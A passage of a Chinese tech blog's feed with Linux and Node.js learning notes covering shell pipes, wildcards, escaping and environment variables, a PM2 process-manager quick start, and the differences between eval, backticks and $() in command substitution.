class="line">[max@localhost 桌面]$ wc -l &lt; test.txt</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p>管道符的概念就是：把前一个命令原本要输出到屏幕的标准正常数据当作是后一个命令的标准输入。</p><p>举个例子，把<code>etc</code>目录下的所有文件的属性信息，作为标准输入传递给 <code>more</code>命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost 桌面]$ ls -l &#x2F;etc&#x2F; | more</span><br><span class="line">总用量 1396</span><br><span class="line">drwxr-xr-x.  3 root root       97 8月  24 04:35 abrt</span><br><span class="line">-rw-r--r--.  1 root root       16 8月  24 04:43 adjtime</span><br><span class="line">-rw-r--r--.  1 root root    21929 1月  29 2014 brltty.conf</span><br><span class="line">drwxr-xr-x.  2 root root        6 1月  29 2014 chkconfig.d</span><br><span class="line">-rw-r--r--.  1 root root     1157 2月   6 2014 chrony.conf</span><br><span class="line">--More--</span><br></pre></td></tr></table></figure><h3 id="命令行中的通配符"><a href="#命令行中的通配符" class="headerlink" title="命令行中的通配符"></a>命令行中的通配符</h3><ul><li>星号（*）代表匹配零个或多个字符</li><li>问号（?）代表匹配单个字符</li><li>中括号内加上数字[0-9]代表匹配0～9之间的单个数字的字符</li><li>而中括号内加上字母[abc]则是代表匹配a、b、c三个字符中的任意一个字符<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ ls</span><br><span class="line">file1  file2  file3  file99  filex</span><br><span class="line">[max@localhost test]$ ls -l file?</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file1</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file2</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file3</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 filex</span><br><span class="line">[max@localhost test]$ ls -l file*</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file1</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file2</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file3</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file99</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 filex</span><br><span class="line">[max@localhost test]$ ls -l file[1-2]</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file1</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file2</span><br><span class="line">[max@localhost test]$ ls -l file[x]</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 filex</span><br></pre></td></tr></table></figure><h3 id="常用的转义字符"><a href="#常用的转义字符" class="headerlink" title="常用的转义字符"></a>常用的转义字符</h3><blockquote><p>反斜杠（\）：使反斜杠后面的一个变量变为单纯的字符串。</p><p>单引号（’’）：转义其中所有的变量为单纯的字符串。</p><p>双引号（””）：保留其中的变量属性，不进行转义处理。</p><p>反引号（``）：把其中的命令执行后返回结果。</p></blockquote></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ PRICE&#x3D;5</span><br><span class="line">[max@localhost test]$ echo &quot;The price of this shirt is $PRICE&quot;</span><br><span class="line">The price of this shirt is 5</span><br></pre></td></tr></table></figure><p>上面的输出看上去挺对的，但是并不完美，我们希望能够输出“The price of this shirt is $5”，于是我们试着这样写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ echo &quot;The price of this shirt is $$PRICE&quot;</span><br><span class="line">The price of this shirt is 9944PRICE</span><br></pre></td></tr></table></figure><p>不幸的是美元符号和变量提取符号合并后<code>$$</code>作用是显示当前程序的进程ID。</p><p>要想让第一个<code>$</code>乖乖地作为美元符号，那么就需要使用反斜杠<code>\</code>来进行转义，将这个命令提取符转义成单纯的文本，去除其特殊功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ echo &quot;The price of this shirt is \$$PRICE&quot;</span><br><span class="line">The price of this shirt is $5</span><br></pre></td></tr></table></figure><p>如果只需要某个命令的输出值时，可以像<code>命令</code>这样，将命令用反引号括起来，达到预期的效果.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ echo &#96;uname -a&#96; &gt;&gt; file1</span><br><span class="line">[max@localhost test]$ cat file1</span><br><span class="line">Linux localhost.localdomain 3.10.0-123.el7.x86_64 #1 SMP Mon May 5 11:16:57 EDT 2014 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><blockquote><p>思考：如何将普通变量转换为全局变量？</p></blockquote><p>使用命令：<code>export [变量名称]</code>，需要在拥有管理员权限时才能正常使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost home]# WORKDIR&#x3D;&#x2F;home&#x2F;workdir</span><br><span class="line">[root@localhost home]# mkdir $WORKDIR </span><br><span class="line">[root@localhost home]# cd $WORKDIR</span><br><span class="line">[root@localhost workdir]# pwd</span><br><span class="line">&#x2F;home&#x2F;workdir</span><br><span class="line">[root@localhost workdir]# exit</span><br><span class="line">exit</span><br><span class="line">[max@localhost home]$ cd $WORKDIR</span><br><span class="line">[max@localhost ~]$ echo $WORKDIR</span><br><span class="line">[max@localhost ~]$ su root</span><br><span class="line">密码：</span><br><span class="line">[root@localhost max]# export WORKDIR</span><br><span class="line">[root@localhost &#x2F;]# su max</span><br><span class="line">[max@localhost &#x2F;]$ cd $WORKDIR</span><br><span class="line">[max@localhost workdir]$ pwd</span><br><span class="line">&#x2F;home&#x2F;workdir</span><br></pre></td></tr></table></figure><h4 id="重点一："><a href="#重点一：" class="headerlink" title="重点一："></a>重点一：</h4><p>在上面的命令中有一个很重要的知识点：</p><blockquote><p>关于如何在Linux中创建一个变量的问题？有两个地方需要注意。</p></blockquote><ol><li>所有字母都需要大写</li><li>变量与赋值符号(=)之间不能存在空格</li><li>无论是系统环境变量还是自定义变量还是全局变量，在调用时 都需要使用<code>$</code>符号来标识。</li></ol><h4 id="重点二"><a href="#重点二" class="headerlink" title="重点二"></a>重点二</h4><ul><li>在Linux 系统中当普通用户身份时命令提示符的前缀标识是：<code>$</code>。</li><li>在Linux 系统中当为管理员身份时命令提示符的前缀标识是：<code>#</code>。</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇文章浅谈一下 Linux 的管道符、重定向和环境变量。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="学习笔记" scheme="https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>PM2 快速上手</title>
    <link href="https://www.0x2beace.com/pm2-quick-start/"/>
    <id>https://www.0x2beace.com/pm2-quick-start/</id>
    <published>2020-07-12T13:44:47.000Z</published>
    <updated>2020-09-04T13:54:47.036Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://pm2.keymetrics.io/" target="_blank" rel="noopener">PM2</a> 是Node.js 生产环境中的进程管理工具，自带负载均衡功能。</p><a id="more"></a><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install pm2 -g</span><br></pre></td></tr></table></figure><p>无缝更新</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 update</span><br></pre></td></tr></table></figure><h2 id="启动应用"><a href="#启动应用" class="headerlink" title="启动应用"></a>启动应用</h2><p>PM2 中有两种方式启动应用，一种是<strong>直接调用应用入口文件</strong>，一种是<strong>通过调用配置文件启动应用</strong>。</p><h3 id="命令行启动"><a href="#命令行启动" class="headerlink" title="命令行启动"></a>命令行启动</h3><p>在生产环境中，通过命令行启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 stat app.js</span><br></pre></td></tr></table></figure><h3 id="配置文件启动"><a href="#配置文件启动" class="headerlink" title="配置文件启动"></a>配置文件启动</h3><p>很多时候，仅仅只是使用 <code>PM2</code> 去启动应用，可能不能完全满足我们的需求。</p><p>当需要对应用有更多的要求时，这个时候就需要用到<code>PM2</code> 的配置文件了。</p><p>PM2 支持通过配置文件创建管理应用，首先在项目根目录手动创建配置文件<code>precesses.json</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;apps&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;myApp&quot;,</span><br><span class="line">      &quot;cwd&quot;: &quot;&#x2F;var&#x2F;www&#x2F;app&#x2F;&quot;,</span><br><span class="line">      &quot;script&quot;: &quot;.&#x2F;app.js&quot;,</span><br><span class="line">      &quot;watch&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者直接使用 <code>pm2 init</code> 命令，自动创建默认的<code>ecosystem.config.js</code>配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  apps : [&#123;</span><br><span class="line">    name: &quot;myApp&quot;,</span><br><span class="line">    script: &#39;index.js&#39;,</span><br><span class="line">    watch: &#39;.&#39;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这两种方式都可以创建管理应用，作用都是一样的，区别只是：一个是<code>json</code>格式的配置文件，一个是<code>js</code>格式的配置文件。</p><p>上面是一个最简单的<code>processes.json</code>配置，创建了一个<code>myApp</code>应用，如果你有多个服务，那么<code>apps</code> 这个数组中创建多个应用。</p><blockquote><p>创建好配置文件之后，那么该如何启动呢？</p></blockquote><p>有两种方式：</p><ol><li>直接调用配置文件启动</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 start processes.json</span><br></pre></td></tr></table></figure><p>可以增加<code>--env</code>参数，来指定当前启动环境。</p><ol start="2"><li>通过<code>package.json</code> 配置文件，配置脚本启动</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; package.json</span><br><span class="line"></span><br><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;start&quot;: &quot;node server&#x2F;index&quot;,</span><br><span class="line">    &quot;pm2&quot;: &quot;pm2 start processes.json&quot;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>然后就可以直接使用<code>npm start pm2</code> 来启动应用了。</p><h4 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h4><p>在配置文件你可以指定环境变量、日志文件、进程文件，重启最大次数…等配置项。支持JSON和YAML格式。</p><p>PM2 的配置支持非常多的参数，下面会对常用的参数一一做说明。</p><table><thead><tr><th>字段</th><th>类型</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>name</td><td>string</td><td>myApp</td><td>应用的名字，默认是脚本文件名</td></tr><tr><td>cwd</td><td>string</td><td>/var/www/myApp</td><td>应用程序所在目录</td></tr><tr><td>script</td><td>string</td><td>./server.js</td><td>应用程序的脚本路径，相对于应用程序所在目录</td></tr><tr><td>log_date_format</td><td>string</td><td>YYYY-MM-DD HH:mm Z</td><td>日志时间格式</td></tr><tr><td>error_file</td><td>string</td><td>-</td><td>错误日志存放路径</td></tr><tr><td>out_file</td><td>string</td><td>-</td><td>输出日志存放路径</td></tr><tr><td>pid_file</td><td>string</td><td>-</td><td>pid文件路径</td></tr><tr><td>watch</td><td>boolean or array</td><td>true</td><td>当目录文件或子目录文件有变化时自动重新加载应用</td></tr><tr><td>ignore_watch</td><td>list</td><td>[”[/]./”, “node_modules”]</td><td>list中的正则匹配的文件和目录有变化时不重新加载应用</td></tr><tr><td>max_memory_restart</td><td>string</td><td>50M</td><td>当应用超过设定的内存大小就自动重启</td></tr><tr><td>min_uptime</td><td>string</td><td>60s</td><td>最小运行时间，这里设置的是60s即如果应用程序在60s内退出，pm2会认为程序异常退出，此时触发重启max_restarts设置数量</td></tr><tr><td>max_restarts</td><td>number</td><td>10</td><td>设置应用程序异常退出重启的次数，默认15次（从0开始计数）</td></tr><tr><td>instances</td><td>number</td><td>1</td><td>启动实例个数</td></tr><tr><td>cron_restart</td><td>string</td><td>1 0 * * *</td><td>定时重启</td></tr><tr><td>exec_interpreter</td><td>string</td><td>node</td><td>应用程序的脚本类型，默认是node</td></tr><tr><td>exec_mode</td><td>string</td><td>fork</td><td>应用启动模式，支持fork和cluster模式，默认为fork</td></tr><tr><td>autorestart</td><td>boolean</td><td>true</td><td>应用程序崩溃或退出时自动重启</td></tr></tbody></table><p>有以下几点需要注意 ⚠️：</p><ol><li>如果<code>processes.json</code>或者<code>ecosystem.config.js</code> 配置文件如果发生了变化，建议直接删除应用之后，重新创建，否则可能部分配置不会生效。</li><li><code>cwd</code> 不要填绝对路径，建议用相对路径，<code>./</code>表示相对于配置文件根目录，否则可能会出现静态资源丢失的情况。</li></ol><h3 id="进程监控"><a href="#进程监控" class="headerlink" title="进程监控"></a>进程监控</h3><p>列出所有节点应用程序（进程/微服务）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 list</span><br><span class="line">$ pm2 ls</span><br></pre></td></tr></table></figure><p>可以将进程列表以JSON格式打印出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 jlist</span><br><span class="line">$ pm2 prettylist</span><br></pre></td></tr></table></figure><p>使用进程ID或名称查看所示的单个Node进程的详细信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 describe &lt;id | app_name&gt;</span><br><span class="line">$ pm2 show &lt;id | app_name&gt;</span><br></pre></td></tr></table></figure><p>实时监控所有进程CPU或内存使用情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 monit</span><br></pre></td></tr></table></figure><h3 id="日志管理"><a href="#日志管理" class="headerlink" title="日志管理"></a>日志管理</h3><p>查看某个应用的日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 logs [&#39;all&#39; | app_name | app_id ]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 logs --json         # JSON 格式输出</span><br><span class="line">$ pm2 logs --format       # 格式化 output</span><br><span class="line">$ pm2 flush               # 清空所有日志文件</span><br><span class="line">$ pm2 reloadLogs          # 重新加载所有日志文件</span><br></pre></td></tr></table></figure><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>停止进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 stop [&#39;all&#39; | app_name | app_id ]</span><br></pre></td></tr></table></figure><p>重启进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 restart [&#39;all&#39; | app_name | app_id ]</span><br></pre></td></tr></table></figure><p>0秒停机重载进程 (用于 NETWORKED 进程)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 reload all</span><br></pre></td></tr></table></figure><p>杀死进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 delete [&#39;all&#39; | app_name | app_id ]</span><br></pre></td></tr></table></figure><h3 id="使用PM2-运行-npm-start"><a href="#使用PM2-运行-npm-start" class="headerlink" title="使用PM2 运行 npm start"></a>使用PM2 运行 npm start</h3><p><code>npm run xxxx</code> 是 node常用的启动方式之一，那么如何使用<code>PM2</code>来实现对该方式的启动呢？</p><p><code>npm run</code>、<code>npm start</code>等命令之所以可以使用，是因为<code>package.json</code>配置文件中增加了对应的脚本命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;start-dev&quot;: &quot;env $(cat .env | xargs) nodemon server&#x2F;index&quot;,</span><br><span class="line">    &quot;start&quot;: &quot;node server&#x2F;index&quot;,</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm2 start npm --watch --name &lt;taskname&gt; -- run &lt;scriptname&gt;;</span><br></pre></td></tr></table></figure><p>其中 <code>--watch</code>监听代码变化，<code>--name</code>重命名任务名称，<code>-- run</code>后面跟脚本名字</p><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 等效于 npm start</span><br><span class="line">pm2 start npm --watch --name webserver -- run start</span><br></pre></td></tr></table></figure><h3 id="稳定运行"><a href="#稳定运行" class="headerlink" title="稳定运行"></a>稳定运行</h3><p>PM2 是一款非常优秀的 Node 进程管理工具，它有着丰富的特性，能够充分利用多核CPU且能够负载均衡、能够帮助应用在崩溃后、指定时间(cluster model)和超出最大内存限制等情况下实现自动重启。</p><p>为了保证能够稳定运行，可以参考以下几点建议：</p><ol><li>应用进程运行时间久了或许总会产生一些意料之外的问题，定时重启可以规避一些不可测的情况；</li><li>最大内存限制，根据观察设定合理内存限制，保证应用异常运行；</li><li><code>min_uptime</code>，<code>min_uptime</code> 是应用正常启动的最小持续运行时长，合理设置设置此范围，可以将超出时间判定为异常启动；</li><li>设定异常重启延时restart_delay，对于异常情况导致应用停止，设定异常重启延迟可防止应用在不可测情况下不断重启的导致重启次数过多等问题；</li><li>设置异常重启次数，如果应用不断异常重启，并超过一定的限制次数，说明此时的环境长时间处于不可控状态，服务器异常。此时便可停止尝试，发出错误警告通知等。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.kancloud.cn/daiji/pm2/395273" target="_blank" rel="noopener">pm2 从入门到精通</a></li><li><a href="https://www.linuxidc.com/Linux/2019-07/159432.htm" target="_blank" rel="noopener">如何在生产服务器上安装PM2运行Node.js应用程序</a></li><li><a href="https://futurestud.io/tutorials/pm2-advanced-app-configuration-with-json-file" target="_blank" rel="noopener">PM2 配置文件说明解析</a></li><li><a href="https://pm2.keymetrics.io/docs/usage/application-declaration/" target="_blank" rel="noopener">PM2 应用配置文件解析</a></li><li><a href="https://fynn90.github.io/2018/01/11/PM2%E5%AE%9E%E7%94%A8%E6%89%8B%E5%86%8C/#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4" target="_blank" rel="noopener">PM2 实用手册</a></li><li><a href="https://www.cnblogs.com/cangqinglang/p/10676162.html" target="_blank" rel="noopener">PM2 用法详解</a></li><li><a href="https://juejin.im/post/5b823506e51d4538d517662f#heading-5" target="_blank" rel="noopener">使用pm2 自动部署node项目</a></li><li><a href="https://blog.windstone.cc/back-end/node/pm2.html#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4" target="_blank" rel="noopener">PM2 中文文档</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;http://pm2.keymetrics.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;PM2&lt;/a&gt; 是Node.js 生产环境中的进程管理工具，自带负载均衡功能。&lt;/p&gt;</summary>
    
    
    
    <category term="Node" scheme="https://www.0x2beace.com/categories/Node/"/>
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Node/Tutorial/"/>
    
    <category term="进程管理" scheme="https://www.0x2beace.com/categories/Node/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Node" scheme="https://www.0x2beace.com/tags/Node/"/>
    
    <category term="PM2" scheme="https://www.0x2beace.com/tags/PM2/"/>
    
    <category term="进程管理" scheme="https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Linux 中的eval、反引号、$()的区别</title>
    <link href="https://www.0x2beace.com/the-difference-between-eval-and-backquotes-in-linux-and/"/>
    <id>https://www.0x2beace.com/the-difference-between-eval-and-backquotes-in-linux-and/</id>
    <published>2020-07-11T12:41:10.000Z</published>
    <updated>2020-07-11T12:46:46.350Z</updated>
    
    <content type="html"><![CDATA[<p>之前在搭建 SSH 环境时，遇到了这样一个问题：</p><blockquote><p>使用命令：<code>eval$(ssh-agent)</code>去创建一个代理进程，但是会提示：<code>No Such file or directory</code> 。</p></blockquote><p>就很纳闷，之前都用着好好的，为什么在新的环境中就不行了？</p><p>后来，了解到原来一直使用的 <code>eval$(ssh-agent)</code> ，其中的<code>$()</code> 原来在<code>Linux</code>中有特殊的意义。</p><p>所以这篇笔记专门用来了解 <code>eval</code> 和 <code>反引号</code> 以及 <code>$()</code>之间的区别。 它们的作用都是<strong>命令替换</strong>。</p><a id="more"></a><h2 id="场景重现"><a href="#场景重现" class="headerlink" title="场景重现"></a>场景重现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ &#96;ssh-agent&#96;</span><br><span class="line">sh.exe&quot;: SSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-myYvgp1404&#x2F;agent.1404;: No such file or directory</span><br><span class="line"></span><br><span class="line">$ eval ssh-agent</span><br><span class="line">SSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-zIQZKN6080&#x2F;agent.6080; export SSH_AUTH_SOCK;</span><br><span class="line">SSH_AGENT_PID&#x3D;1092; export SSH_AGENT_PID;</span><br><span class="line">echo Agent pid 1092;</span><br><span class="line"></span><br><span class="line">$ eval &#96;ssh-agent&#96;</span><br><span class="line">Agent pid 4288</span><br></pre></td></tr></table></figure><p>直到我输入 eval <code>ssh-agent</code> 时，似乎就对了。</p><h3 id="命令代换"><a href="#命令代换" class="headerlink" title="命令代换"></a>命令代换</h3><p>这三种不同的方式都是<code>shell</code>脚本中的命令代换。</p><p>命令代换是指<code>shell</code>能够将一个命令的标准输出插在一个命令行中任何位置。</p><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><p>首先要介绍的是: <code>eval</code></p><p>它的作用是：<strong>重新运算求出参数的内容</strong>。</p><p>该命令使用于那些一次扫描无法实现其功能的变量。该命令对变量进行两次扫描。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ touch test.txt</span><br><span class="line">$ vim test.txt      </span><br><span class="line">&#x2F;&#x2F; 写入 Hello eval</span><br><span class="line"></span><br><span class="line">$ var&#x3D;&quot;cat test.txt&quot;</span><br><span class="line">&#x2F;&#x2F; 注意：中间没有空格，前面没有美元符号。</span><br><span class="line"></span><br><span class="line">$ echo $var</span><br><span class="line">cat test.txt</span><br><span class="line">$ eval $var</span><br><span class="line">Hello eval</span><br></pre></td></tr></table></figure><h4 id="反引号与"><a href="#反引号与" class="headerlink" title="反引号与 $()"></a>反引号与 $()</h4><p>实例一：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ DATE1&#x3D;$(date)</span><br><span class="line">$ DATE2&#x3D;&#96;date&#96;</span><br><span class="line">$ DATE3&#x3D;&#96;eval date&#96;</span><br><span class="line"></span><br><span class="line">$ echo $DATE1</span><br><span class="line">2019年01月23日 21:20:36</span><br><span class="line">$ echo $DATE2</span><br><span class="line">2019年01月23日 21:20:36</span><br><span class="line">$ echo $DATE3</span><br><span class="line">2019年01月23日 21:20:36</span><br></pre></td></tr></table></figure><p>实例二：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ echo &#96;echo &#39;\\&#39;&#96; </span><br><span class="line">\</span><br><span class="line">$ echo $(echo &#39;\\&#39;)</span><br><span class="line">\\</span><br></pre></td></tr></table></figure><p>暂时没太明白这三者的实际应用场景，不过了解到了 它们之间的一些区别与联系。</p><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><ul><li><a href="https://kyle.io/2012/09/ssh-agent-messiness-solving-it/" target="_blank" rel="noopener">https://kyle.io/2012/09/ssh-agent-messiness-solving-it/</a></li><li><a href="https://blog.csdn.net/Y1730008223CONG/article/details/74136055" target="_blank" rel="noopener">shell脚本中命令代换：反引号、$()、eval区别</a></li><li><a href="https://blog.csdn.net/if9600/article/details/74221548" target="_blank" rel="noopener">shell脚本中命令代换：反引号、$()、eval区别2</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;之前在搭建 SSH 环境时，遇到了这样一个问题：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;使用命令：&lt;code&gt;eval$(ssh-agent)&lt;/code&gt;去创建一个代理进程，但是会提示：&lt;code&gt;No Such file or directory&lt;/code&gt; 。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;就很纳闷，之前都用着好好的，为什么在新的环境中就不行了？&lt;/p&gt;
&lt;p&gt;后来，了解到原来一直使用的 &lt;code&gt;eval$(ssh-agent)&lt;/code&gt; ，其中的&lt;code&gt;$()&lt;/code&gt; 原来在&lt;code&gt;Linux&lt;/code&gt;中有特殊的意义。&lt;/p&gt;
&lt;p&gt;所以这篇笔记专门用来了解 &lt;code&gt;eval&lt;/code&gt; 和 &lt;code&gt;反引号&lt;/code&gt; 以及 &lt;code&gt;$()&lt;/code&gt;之间的区别。 它们的作用都是&lt;strong&gt;命令替换&lt;/strong&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="学习笔记" scheme="https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Shell" scheme="https://www.0x2beace.com/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>Linux 中的Shell 种类</title>
